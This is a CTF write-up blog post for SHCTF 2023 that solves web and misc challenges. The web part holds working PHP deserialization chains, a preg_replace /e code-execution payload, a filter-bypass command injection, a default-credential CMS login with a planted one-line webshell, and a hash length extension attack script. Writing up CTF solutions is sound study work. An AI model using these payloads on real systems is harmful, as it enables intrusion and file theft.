---
title: SHCTF 2023 
description: web&misc wp
tags:
  - CTF
  - MISC
  - WEB
categories:
  - write up
cover: 'https://tuchuang.voooe.cn/images/2024/03/19/da01153133d54666a67b2c39f9bd04f5.png'
abbrlink: SHCTF2023
date: 2024-03-08 10:20:00
---
## web

### **[WEEK1]ezphp**

   prep_replace /e    命令执行



[深入研究 preg_replace \e 模式下的代码执行_preg_replace /e-CSDN 博客](https://blog.csdn.net/weixin_49656607/article/details/119833707)

[preg_replace 函数/e 模式下的代码执行 + 一道例题 - Hel10 - 博客园](https://www.cnblogs.com/HelloCTF/p/13184476.html#%E7%9C%8B%E4%B8%80%E9%81%93ctf%E9%A2%98-----bjdctf2020zjctf%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4)

[慎用 preg_replace 危险的/e 修饰符(一句话后门常用) - 稻禾盛夏 - 博客园](https://www.cnblogs.com/dhsx/p/4991983.html)

**payload：
GET:
?code=${phpinfo()}
POST:
pattern=.***

Ctrl+f 搜索 flag 即可

### **[WEEK1]ez_serialize**

反序列化 invoke wakeup get toString



[[CTF]PHP 反序列化总结_ctf php 反序列化-CSDN 博客](https://blog.csdn.net/solitudi/article/details/113588692)

[0x013 pop 链构造解释_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1R24y1r71C/?p=14&spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=f7e76ebc6ca15fbb8c8dc4909fad4f40)

**exp：**

```php
<?php

class A{
  public $var_1='flag.php';
  
  public function __invoke(){
   include($this->var_1);
  }
}

class B{
  public $q;
  public function __wakeup()
{
  if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->q)) {
            echo "hacker";           
        }
}

}
class C{
  public $var;
  public $z;
    public function __toString(){
        return $this->z->var;
    }
}

class D{
  public $p;
    public function __get($key){
        $function = $this->p;
        return $function();
    }  
}
$a=new A();
$d=new D();
$d->p=$a;
$c=new C();
$b=new B();
$c->z=$d;
$c->var=$b;
$b->q=$c;
echo serialize($b);

?>
```

    ?payload=O:1:"B":1:{s:1:"q";O:1:"C":2:{s:3:"var";r:1;s:1:"z";O:1:"D":1:{s:1:"p";O:1:"A":1:{s:5:"var_1";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}}

### [WEEK1]babyRCE

rce



![](https://s2.loli.net/2024/03/08/ON594zohXw21uvG.png)

**uniq 没过滤**

**flag 用 fl?g 代替**

**分号用 %0a 代替**

**空格用 %09 代替**

    ?rce=uniq$IFS/fl?g%0a

### **[WEEK1]生成你的邀请函吧~**

request 请求



![](https://s2.loli.net/2024/03/08/ocwKgbteWvGYBAz.png)

```python
import requests

# 定义API端点URL
url = "url/generate_invitation" #放url

# 准备请求体数据
data = {
    "name": "Yourname",
    "imgurl": "http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb&spec=640&img_type=jpg"
}

# 发送POST请求
response = requests.post(url, json=data)

# 检查响应状态码
if response.status_code == 200:
    # 以二进制方式写入响应内容到文件
    with open("invitation.jpg", "wb") as f:
        f.write(response.content)
    print("邀请函已保存为 invitation.jpg")
else:
    print("请求失败，状态码:", response.status_code)
```

![](https://s2.loli.net/2024/03/08/k4MAlVHROESdxez.png)

### **[WEEK1]飞机大战**

  js 代码检查



搜索 won

![](https://s2.loli.net/2024/03/08/uLazEUkrVxZD85C.png)

解 unicode 再转 base64

![](https://s2.loli.net/2024/03/08/bFuhfae8KOL3iEt.png)

### **[WEEK1]登录就给 flag**

爆破密码



![](https://s2.loli.net/2024/03/08/9FN6hXBlU7bP3qa.png)

爆破密码即可，这里用的弱口令字典爆破

![](https://s2.loli.net/2024/03/08/9fPEFT5ZYxOmRj4.png)

![](https://s2.loli.net/2024/03/08/yCagipwA8el9RJ3.png)

![](https://s2.loli.net/2024/03/08/CfhA7uLzEF2IR6V.png)

### **[WEEK1]1zzphp**

正则回溯绕过，正则匹配数组绕过



![](https://s2.loli.net/2024/03/08/qtKxZkaWlcjSeiI.png)

num[]=1 绕过前两个 if

后面两个 if 绕过如下 [blog.csdn.net](https://blog.csdn.net/yourdawntown/article/details/120558237)

```python
import requests

data={"c_ode":"a"*1000000+"2023SHCTF"}
url="http://112.6.51.212:30028/?num[]=1"
res = requests.post(data=data,url=url)

print(res.text)
```

![](https://s2.loli.net/2024/03/08/QGYVbsW84yI5PfM.png)

### **[WEEK2]no_wake_up**

wake_up 绕过



![](https://s2.loli.net/2024/03/08/wlnrA89Y64ZWozH.png)

绕过 wake up 即可，利用伪协议读 flag.php

![](https://s2.loli.net/2024/03/08/cETJxLbj7VeS2Fr.png)

构造 payload：

```
<?php

class flag{
    public $username='admin';
    public $code='php://filter/read=convert.base64-encode/resource=flag.php';}
$a=new flag();
echo serialize($a);
?>
```

**O:4:"flag":2:{s:8:"username";s:5:"admin";s:4:"code";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}**

给前面的属性值 +1 即可绕过


    O:4:"flag":3:{s:8:"username";s:5:"admin";s:4:"code";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}


![](https://s2.loli.net/2024/03/08/1M2uwDqOLF6TGWz.png)

![](https://s2.loli.net/2024/03/08/iO8LBa73JQks5YW.png)

###    **[WEEK2]EasyCMS**

   taoCMS 漏洞



[Taocms 代码注入漏洞(CVE-2022-25578)_taocms 演示系统漏洞](https://blog.csdn.net/huayimy/article/details/127611217)

dirsearch 扫到后台的登录地址

URL/admin/admin.php

账号：admin（默认）

密码：tao    （默认）

成功登录管理员账户

![](https://s2.loli.net/2024/03/08/IjAu78Wo2CYdmHt.png)

在文件管理处新建一个 php 文件，内容为一句话木马，然后保存访问执行系统命令即可

![](https://s2.loli.net/2024/03/08/6jR3eEGDsYCu2hH.png)


### **[WEEK2]MD5 的事就拜托了**

parse_url() 套娃，intval()漏洞   哈希长度拓展攻击



`<?php
$url = 'host://SHCTF:pass@user/SHCTF?args=value#anch';
print_r(parse_url($url));
echo parse_url($url, PHP_URL_PATH);
?>`


![](https://s2.loli.net/2024/03/08/F9bpCiVQArzMR3I.png)

**第一个if：parse_url函数的解释和绕过
让$schema =host
则$$schema=$host
让$host=user
$z$$schema=$host=user
让user=SHCTF
则$$$schema=SHCTF
POST:SHCTF=host://SHCTF:pass@user/SHCTF?args=value#anch
第二个if：
利用intval(400.123)=400的特性
?length=4.1234**

![](https://s2.loli.net/2024/03/08/JNGftxzeWld4Phu.png)

![](https://s2.loli.net/2024/03/08/wiQDBKIt9LdXVNE.png)

**$flag
       md5值：c1514bd780fad6fcaf27bde0344acee0
       长度：42
$num，$SHCTF均可控
if($_POST['SHCTF']===md5($flag.urldecode($num))) #这里的.和+是一个意思，都是拼接
假如$flag=aaa , $num=123
则拼接为aaa123
这里涉及到哈希长度拓展攻击**

[MD5 的 Hash 长度扩展攻击原理及应用](https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/)

下面是一个 py 脚本，能实现 hashpump 的功能（来自 [hash-ext-attack](https://github.com/shellfeel/hash-ext-attack/tree/master)）

```python
import base64
import hashlib
import hmac
import struct
import sys
import time
import urllib.parse

from common.md5_manual import md5_manual
from loguru import logger
from common.crypto_utils import CryptoUtils

class HashExtAttack:
    """
    哈希长度扩展攻击,解决 hashpump 在win下使用困难的问题
    目前仅支持md5，如果你对认证算法有了解可以手动改写str_add中的字符串拼接方式
    """

    def __init__(self):
        self.know_text = b""
        self.know_text_padding = b""
        self.new_text = b""
        self.rand_str = b''
        self.know_hash = b"3c5a36dd888251601d36bbc184648717"
        self.key_length = 15

    def _padding_msg(self):
        """填充明文"""
        logger.debug("填充明文")
        self.know_text_padding = md5_manual.padding_str(self.know_text)
        logger.debug(f"已知明文填充：{self.know_text_padding}")

    def _gen_new_plain_text(self):
        """生成新明文"""
        self.new_text = self.know_text_padding + self.rand_str  # b'80' + 55 * b'\x00' + struct.pack("<Q", 512 + len(self.rand_str) *8)
        logger.debug(f"new_text: {self.new_text}")

    def split_hash(self, hash_str: bytes):
        by_new = CryptoUtils.trans_str_origin2_bytes(hash_str.decode())
        return struct.unpack("<IIII", by_new)

    def _guess_new_hash(self) -> tuple:
        """生成新hash"""
        # 第一步先生成新的字符串
        # 对已知明文进行填充
        self._padding_msg()
        # 第二步 生成新明文
        self._gen_new_plain_text()
        # 第三步 生成新hash(基于已知hash进行计算)
        # 3.1 hash拆分成4个分组
        hash_block = self.split_hash(hash_str=self.know_hash)
        md5_manual.A, md5_manual.B, md5_manual.C, md5_manual.D = hash_block
        tmp_str = md5_manual.padding_str(self.new_text)
        logger.debug(f"新明文填充tmp_str({len(tmp_str)}): {tmp_str}")
        logger.debug(f"参与手工分块计算的byte：{tmp_str[-64:]}")
        md5_manual.solve(tmp_str[-64:])
        self.new_hash = md5_manual.hex_digest()

        return self.new_text, self.new_hash

    def run(self, know_text, know_hash, rand_str, key_len) -> tuple:
        # self.know_text = input("请输入已知明文：")
        self.know_text = ("*" * key_len + know_text).encode()  # 密钥拼接
        self.know_hash = know_hash.encode()
        self.rand_str = rand_str.encode()

        self._guess_new_hash()
        logger.info(f"已知明文：{self.know_text[key_len:]}")
        logger.info(f"已知hash：{self.know_hash}")
        logger.debug(f"任意填充：{self.rand_str}")
        logger.info(f"新明文：{self.new_text[key_len:]}")
        logger.info(f"新明文(url编码)：{urllib.parse.quote(self.new_text[key_len:], safe='&=')}")
        # logger.debug(f"新明文：{base64.b64encode(self.new_text[key_len:])}")
        logger.info(f"新hash:{self.new_hash}")
        return self.new_text[key_len:], self.new_hash

    def input_run(self):
        time.sleep(0.2)
        self.run(input("请输入已知明文："), input("请输入已知hash： "), input("请输入扩展字符: "),
                 int(input("请输入密钥长度：")))

    def test(self):
        self.run(
            "order_id=70&buyer_id=17&good_id=38&buyer_point=300&good_price=888&order_create_time=1678236217.799935",
            "178944d4a39e4e4af6522c6de6cb24c5", "&good_price=1", 50)

hash_ext_attack = HashExtAttack()

if __name__ == '__main__':

    logger.remove()
    logger.add(sys.stderr, level="INFO")
    hash_ext_attack.input_run()
```

![](https://s2.loli.net/2024/03/08/6GT3ewiB8AymEOQ.png)

明文也就是 $flag 我们不知道，直接给空

然后 hash 和长度都给 $flag 的，扩展字符随意

**payload：
Get:
url/?length=%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%00abcd
POST:
SHCTF=738951256b789b8e5daef107b88a7a97**

![](https://s2.loli.net/2024/03/08/nj7INtryALHGP8p.png)

### **[WEEK2]ez_ssti**

[SSTI(模板注入) 解析 和 ctf 做法_ctf flask 模板注入-CSDN 博客](https://blog.csdn.net/m0_56107268/article/details/127927582?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169709476616800197039314%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169709476616800197039314&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-127927582-null-null.142%5Ev96%5Epc_search_result_base3&utm_term=ssti%20ctf&spm=1018.2226.3001.4187)

![](https://s2.loli.net/2024/03/08/sAZpExJoGfjc1RU.png)

### **[WEEK2]serialize**

正则绕过，_toString _wakeup _get 非法参数名 伪协议



[PHP 反序列化](https://y4tacker.gitee.io/2021/02/03/year/2021/2%E6%9C%88/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)

![](https://s2.loli.net/2024/03/08/F3ZGBvHkSaWbgwy.png)

![](https://s2.loli.net/2024/03/08/ZNGklwrCd7zQcDi.png)

```
<?php
class misca{
    public $gao;
    public $fei;
    public $a;
}
class musca{
    public $ding;
    public $dong;
}
class milaoshu{
    public $v='php://filter/read=convert.base64-encode/resource=flag.php';
}

$misca = new misca();
$musca= new musca();
$milaoshu=new milaoshu();   //创建对象

$musca ->ding = $misca;          //把对象misca给ding,在misca里没有$dong这个属性,触发_get
$misca ->gao = &$misca->a;   //把a的地址给gao，在方法_get里导致ding的值赋值给了$a
$misca ->fei = $milaoshu;        //fei的值设置为对象milaoshu，由die()触发_toString

echo serialize(array($musca));//利用数组绕过正则匹配
```

![](https://s2.loli.net/2024/03/08/hjplyRxV6rH2OBI.png)


### [WEEK3] 快问快答

脚本编写



抓包看到是 post 传的答案

![](https://s2.loli.net/2024/03/08/Eepo2nByTNGqdMQ.png)

脚本：

```python
import requests
from bs4 import BeautifulSoup
import re
import time

# 创建会话
s = requests.Session()
url = 'http://112.6.51.212:30842/' #url

# 循环答题
correct_answers = 0
for i in range(70):  # 除法运算时有些报错，影响了循环，这里改70
    # 获取题目
    r = s.get(url)
    r.encoding = 'utf-8'
    soup = BeautifulSoup(r.text, "html.parser")
    question_text = soup.find("h3").text
    print(question_text)

    # 使用正则表达式从题目中提取数字和运算符
    matches = re.match(r'题目：(\d+) (异或|与|[+\-x÷]) (\d+) =', question_text)
    # 等待一秒
    time.sleep(1)
    if matches:
        num1 = int(matches.group(1))
        operator = matches.group(2)
        num2 = int(matches.group(3))

        if operator == '+':
            answer = num1 + num2
        elif operator == '-':
            answer = num1 - num2
        elif operator == 'x':
            answer = num1 * num2
        elif operator == '÷':
            answer = num1 / num2
        elif operator == '异或':
            answer = num1 ^ num2
        elif operator == '与':
            answer = num1 & num2

        # 准备POST数据
        data = {"answer": answer}

        # 发送答案
        response = s.post(url, data=data)
        print(f"答案：{answer}")
        print(response.text)  # 输出对应的response.text
```

> 能用就行脚本 )
<br>

## misc

### **[WEEK1]签到题**

base128



![](https://s2.loli.net/2024/03/08/dbHXG1oW2BpwvTt.png)

如题，两个 64 解密即可

![](https://s2.loli.net/2024/03/08/DBwMfm17dSnRThv.png)

**flag{this_is_flag}**

### **[WEEK1]也许需要一些 py**

   png 文件头，md5 爆破大小写字母



![](https://s2.loli.net/2024/03/08/VfUCRs7MyG2Imgc.png)

打开 flag 文件是 png 结构,缺少文件头,补上即可

![](https://s2.loli.net/2024/03/08/5KptClm9aLXuqSf.png)

![](https://s2.loli.net/2024/03/08/B8mcVb3tp4AeUWP.png)

加密后的 md5,暂时不管,还有个摩斯密码解密一下

![](https://s2.loli.net/2024/03/08/35FTbmPUkNeB4pV.png)

结合描述

![](https://s2.loli.net/2024/03/08/94BMJhgkqdw51rA.png)

THIS1SY0UKEY 转小写即可

![](https://s2.loli.net/2024/03/08/L6XUQKYSntg3VBa.png)

这是 flag,但是大小写不是正确的,结合刚才得到的 md5 可以推测

md5 解密后对应的是正确大小写的 flag,但是 md5 只能加密不能解密

所以这里先把所有的大小写可能罗列,然后计算其 md5 值,并与我们的 md5 值进行比较

脚本如下

```python
import hashlib

# 目标MD5哈希值
MD5 = "63e62fbce22f2757f99eb7da179551d2"
# 已知的正确字母的字符串
key = "pNg_and_Md5_SO_GreaT"

# 递归函数，生成所有可能的大小写组合
def generate_variants(current_variant, index):
    if index == len(current_variant):
        md5_hash = hashlib.md5(current_variant.encode()).hexdigest()
        if md5_hash == MD5:
            print(f"找到匹配的字符串: {current_variant}")
            return
        return

    generate_variants(current_variant, index + 1)  # 不更改当前字符的大小写
    if current_variant[index].isalpha():
        new_variant = current_variant[:index] + current_variant[index].swapcase() + current_variant[index+1:]
        generate_variants(new_variant, index + 1)  # 更改当前字符的大小写

generate_variants(key, 0)
```

![](https://s2.loli.net/2024/03/08/Ja8DMU3fY65KTEQ.png)

**flag{Png_AnD_md5_so_GReAt}**

### **[WEEK1]ez-misc**

01 转二维码，rockyou 字典爆破，字频统计



![](https://s2.loli.net/2024/03/08/Al3WJdbPUG8pnXD.png)

01 转二维码脚本

```python
from PIL import Image
from zlib import *

MAX = 29 # 先数出数字的比例，这题是29*29
pic = Image.new("RGB",(MAX,MAX))
str ="xxx"                  #放01文本进去
i=0
for y in range(0,MAX):
    for x in range(0,MAX):
        if(str[i] == '1'):
            pic.putpixel([x,y],(0,0,0))
        else:pic.putpixel([x,y],(255,255,255))
        i = i+1
pic.show()
#pic.save("flag.png") 保存就使用这个，保存在当前目录
```

微信扫码得到

![](https://s2.loli.net/2024/03/08/8Z4qdJLeTDOXUIb.png)

hit_k1sme4_4_fun

拿这个密码解密加密文件得到

![](https://s2.loli.net/2024/03/08/cX2mtWGoJ4B7uVK.png)

改后缀 zip 打开

![](https://s2.loli.net/2024/03/08/FahQ4EpigYj3fWr.png)

解密下面的二进制码得到 rockyou

![](https://s2.loli.net/2024/03/08/oOERWAGnw8tS5g2.png)

但 rockyou 不是 flag.txt 的解压密码，这里的意思是用 kali 自带的字典 rockyou.txt 进行字典爆破密码

[Kali 自带密码字典 rockyou.txt 解压-CSDN 博客](https://blog.csdn.net/weixin_44802617/article/details/126842861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169633779616777224469056%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169633779616777224469056&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-126842861-null-null.142%5Ev94%5EchatsearchT3_1&utm_term=rockyou&spm=1018.2226.3001.4187)

![](https://s2.loli.net/2024/03/08/AUEz7tVmN68X59v.png)

我这里运行不动不知道原因，就把字典拉到 win 的 ARCHPR 上用了

![](https://s2.loli.net/2024/03/08/HalUuALBZ4F98gz.png)

密码：palomino

![](https://s2.loli.net/2024/03/08/Bq6DgykUrSlWXY7.png)

字频统计

![](https://s2.loli.net/2024/03/08/pmAbSVkHxe6J5MG.png)

**flag{SHyk1sme4}**


### **[WEEK1]Jaeger lover**

搜索能力，oursecret 工具



![](https://s2.loli.net/2024/03/08/rlSgD1VnRBh2Pey.png)

翻译：你知道环太平洋吗？

这里的标题 jaeger 是环太平洋里的机甲

![](https://s2.loli.net/2024/03/08/Ad7ZHM8PJYuRxkU.png)

zip 里面是个加密的 png，Typhoon 的图片底部有 base 文本

![](https://s2.loli.net/2024/03/08/iJGrj5twNXVUgZb.png)

![](https://s2.loli.net/2024/03/08/cHkodnba5YFjpR6.png)

> you know the Windows is a system for PC,but do you know the what is thr Op. System for this Jaeger？

要我们找 jaeger 的操作系统，这里考察搜索能力，操作如下

![](https://s2.loli.net/2024/03/08/Gt4RENpx2YLK1vf.png)

[https://pacificrim.fandom.com/wiki/Crimson_Typhoon_(Jaeger)](https://pacificrim.fandom.com/wiki/Crimson_Typhoon_(Jaeger))

![](https://s2.loli.net/2024/03/08/JGSHNxTEhfQtzug.png)

key：Tri-Sun Horizon Gate

但它不是压缩包的密码，根据题目描述，这张 Typhoon 还有一个操作没做

steghide 解密

![](https://s2.loli.net/2024/03/08/73aIbqvgsMim84j.png)

.*+#1Ao/aeS  拿到这一串 key 解密 zip 文件

拿到图片

![](https://s2.loli.net/2024/03/08/rk3VPRXeyKdwLID.png)

改宽高

![](https://s2.loli.net/2024/03/08/kTwRXncBt4e9vSm.png)

K34-759183-191，现在只剩一步了，根据图片名字 secret

尝试 oursecret 解密，图片选择修复后的图片，密码：K34-759183-191

![](https://s2.loli.net/2024/03/08/WehbkGrKfQ8TcPy.png)

![](https://s2.loli.net/2024/03/08/kjqP3yZsHEeTgpU.png)

**flag{A1l_boys_aRe_Jaeger_L0ver!!}**

### **[WEEK1]Steganography**

   exif 010editor



![](https://s2.loli.net/2024/03/08/RBWSQrlyUsbdOwv.png)

第一张图 010 打开尾部解密 base64

![](https://s2.loli.net/2024/03/08/D4Ezs1X8jbdOCcU.png)

![](https://s2.loli.net/2024/03/08/p3165egjUHrxLWZ.png)

12ercs.....909jk

![](https://s2.loli.net/2024/03/08/CpJ3QekDjf4W5mX.png)

第二张图得到 xqwed，把它放入.....中

key：12ercsxqwed909jk

解压得到 flag

**flag{4d72e4f3-4d4f-4969-bc8c-a2f6f7a4292c}**

### **[WEEK1]可爱的派蒙捏**

binwalk，文本对比



拿到一张图片

binwalk 分离

![](https://s2.loli.net/2024/03/08/qNpBDt7nmaicYUx.png)

两个文本非常相似，[中文，代码文本比较](https://www.jq22.com/wbdb/)

![](https://s2.loli.net/2024/03/08/fy5TDk932J8NQHU.png)

一个一个打出来即可

**flag{4ebf327905288fca947a}**

### **[WEEK1]message**

pdu 编码



![](https://s2.loli.net/2024/03/08/LuxCXPi5JtZFpTR.png)

![](https://s2.loli.net/2024/03/08/e73DJBhLPVUr5dt.png)

[PDU 编码解码工具](http://www.sendsms.cn/pdu/)

![](https://s2.loli.net/2024/03/08/yZxp2UnWtwo9h3F.png)

**SHCTF{ba978405-b1c8-847c-8e69-f62177e4c087}**

### **[WEEK2]远在天边近在眼前**

文件目录即为 flag



![](https://s2.loli.net/2024/03/08/kFRYJ6cGr5eZ7ax.png)

里面很多嵌套的文件夹，目录即为 flag

```python
import zipfile
import os

# 指定ZIP文件路径
zip_file_path = "C:/Users/Nanian233/Downloads/Compressed/find_me.zip"

# 打开ZIP文件
with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
    # 列出ZIP文件中的所有内容
    for item in zip_file.namelist():
        # 输出文件或文件夹的名称
        print("ZIP文件中的内容:", item)
```

**注意：如果先解压 zip 再去查看的话，？会被转化为_，这应该跟 win 解压的文件名会自动转化某些字符有关**

**所以这里的脚本是直接打开 zip 然后继续查看里面的内容**

![](https://s2.loli.net/2024/03/08/rTQXnBE3GSmvfgA.png)

删除/ 并且逆向即可

![](https://s2.loli.net/2024/03/08/PpJRU3KgEjqe5b2.png)

### **[WEEK2]奇怪的 screenshot**

win11 截图漏洞 [CVE-2023-28303](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28303) 百家姓编码



操作参考：[misc 杂刷](https://tiyjbs9b260.feishu.cn/docx/RyEodPWqmo7kLAxDUtccDSgOnyb#doxcnfoQRFOzhwc4Qo6mM3Yyejf) 羊城杯 2023 ez_misc

工具地址：[frankthetank-music/Acropalypse-Multi-Tool: Easily detect and restore Acropalypse vulnerable](https://github.com/frankthetank-music/Acropalypse-Multi-Tool)

![](https://s2.loli.net/2024/03/08/3A98VbIcpaiBFCJ.png)

![](https://s2.loli.net/2024/03/08/3bXu7lPOm2hYN9e.png)

magnet:?xt=urn:btih:flagCVE-2023-28303-Win11-Snipping-t00l-is-n0t-Secure

**flag{CVE-2023-28303-Win11-Snipping-t00l-is-n0t-Secure}**

> 以下四题是自己出的，过于简单(就只展示操作了

### **[WEEK2]喜帖街**

频谱图 steghide Ook



![](https://s2.loli.net/2024/03/08/UswHTo8hBLYaVpF.png)

Steghide extract -sf

password：LeeTung

![](https://s2.loli.net/2024/03/08/TFYwSNygoUfmOZE.png)

[Brainfuck/Ook! Obfuscation/Encoding [splitbrain.org]](https://www.splitbrain.org/services/ook)

![](https://s2.loli.net/2024/03/08/ChHByoresai6mvQ.png)

###    **[WEEK2]可爱的洛琪希**

   伪加密 base64 转 jpg exif 维吉尼亚



[CTF——zip 伪加密_xiaozhaidada 的博客-CSDN 博客](https://blog.csdn.net/xiaozhaidada/article/details/124538768?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169711311316800225547016%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169711311316800225547016&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-124538768-null-null.142%5Ev96%5Epc_search_result_base3&utm_term=%E4%BC%AA%E5%8A%A0%E5%AF%86&spm=1018.2226.3001.4187)

![](https://s2.loli.net/2024/03/08/kvmpGHtFQD1wPsx.png)

打开得到一大串 base64

![](https://s2.loli.net/2024/03/08/9Jqw6tA2Eyc8UCi.png)

保存 jpg 文件，右键属性打详细信息

![](https://s2.loli.net/2024/03/08/wnPJQFageqMZTR4.png)

736c6e6f7b52626b795f71696966686b76217d

![](https://s2.loli.net/2024/03/08/xHYBp85rb1gKjLi.png)

010 打开底部拿到 key:nanian

![](https://s2.loli.net/2024/03/08/gd9TZVFHMAsNBxI.png)

### **[WEEK2]图片里的秘密**

图片分离 单图盲水印



binwalk 题目图片，获得一个压缩包

打开里面的图片进行盲水印提取即可

![](https://s2.loli.net/2024/03/08/htaR5xLeYi83Cjl.png)

### **[WEEK2]表里的码**

excel 后缀名 粗细字体转二维码



![](https://s2.loli.net/2024/03/08/a4VtHnBzcCXl1QE.png)

改后缀为 xlsx 打开

Ctrl+H 打开替换，把粗体换成填充黑色的格子即可

![](https://s2.loli.net/2024/03/08/AC38MQKRGvZ4HqJ.png)

扫码得到 flag


### **[WEEK3]尓纬玛**

纠错



![](https://s2.loli.net/2024/03/08/7XHxCUFteY85rJD.png)

[二维码之 QR 码生成原理与损坏修复 - luogi - 博客园](https://www.cnblogs.com/luogi/p/15469106.html#%E4%BA%8C%E7%BB%B4%E7%A0%81%E6%81%A2%E5%A4%8D%E6%8C%91%E6%88%98-%E4%BA%8C%E7%BB%B4%E7%A0%81%E6%81%A2%E5%A4%8D%E5%B7%A5%E5%85%B7)

[qrazybox 工具](https://merri.cx/qrazybox/)

![](https://s2.loli.net/2024/03/08/3NHcXB8CqSUzJ1I.png)

相同操作：解得一半的 flag

![](https://s2.loli.net/2024/03/08/Vt5WQ6xyuwO9FXs.png)

[ctftime.org](https://ctftime.org/writeup/1648)

我们把 final data bits 里的第一行数据进行二进制解密

去掉前 4(表示模式)+8(表示长度)位和后 4+8 位得到完整 flag

![](https://s2.loli.net/2024/03/08/loWn4mwBNjFcSEi.png)

[二维码是如何设计出来的？](https://www.163.com/dy/article/HHKUTLTI0511FQO9.html)

![](https://s2.loli.net/2024/03/08/VUQoHdEint2A8CB.png)

![](https://s2.loli.net/2024/03/08/GXZKmeSjWon2Tx9.png)

格式信息存储了两次，因此即使 QR 码被部分遮挡也可以读取。

![](https://s2.loli.net/2024/03/08/9AWvsrRgliNFTKw.png)

[「QRCode 标准阅读」#0 总章](https://blog.tonycrane.cc/p/409d352d.html)

**二维码结构：

功能图案（function patterns）
  静默区（quiet zone）：至少4个单位宽
  特征符（finder pattern）：7x7黑圈 5x5白圈 3x3黑块
  分割线（separator）：在特征符周围的一圈全白区域
  时序图案（timing patterns）：第7行第7列的两条黑白条纹
  对齐图案（alignment patterns）：版本1无，版本2-6 1个，版本7-13 6个……（附录E）
  
编码区域（encoding region）
  格式信息（format information）：左上角分割线外一圈，左下角分割线右侧，右上角分割线下侧
  版本信息（version information）：版本7后才有，在左下分割线上侧，右上分割线左侧
  数据及纠错码区域  (data  and  errorcorrectioncodewords)**

![](https://s2.loli.net/2024/03/08/3YKzL5njxNw8od6.png)





